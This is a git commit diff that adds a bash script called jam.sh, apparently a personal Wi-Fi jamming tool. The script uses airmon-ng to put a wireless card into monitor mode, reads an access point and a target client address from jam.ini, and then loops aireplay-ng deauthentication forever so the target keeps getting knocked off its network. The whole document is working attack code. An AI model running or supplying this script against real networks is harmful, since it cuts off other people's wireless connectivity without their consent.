4db72d5fbfd1599615dc1e3eebe261a891d21beb
Nikola Tasic <ntasic7@gmail.com>
2019-02-02 00:13:54 +0100

    jam

--- jam.sh
+++ jam.sh
@@ -1,4 +1,14 @@
 #!/bin/bash
-sudo timeout 5 airodump-ng -w my --output-format csv --write-interval 1   wlp0s18f2u2mon 
-#cat output.txt
-#sudo airodump-ng wlp0s18f2u2mon 2>&1 | grep BSSID
+echo $2
+sudo airmon-ng stop "$1mon"
+sudo airmon-ng start $1 $2
+ap=$(awk -F'=' '/ap/ {print $2}' jam.ini)
+target=$(awk -F'=' '/target/ {print $2}' jam.ini)
+echo "AP:     $ap"
+echo "TARGET: $target"
+sleep 2
+while [ true ]
+do
+	sudo aireplay-ng -0 1 -a $ap -c $target "$1mon"
+	sleep 2
+done
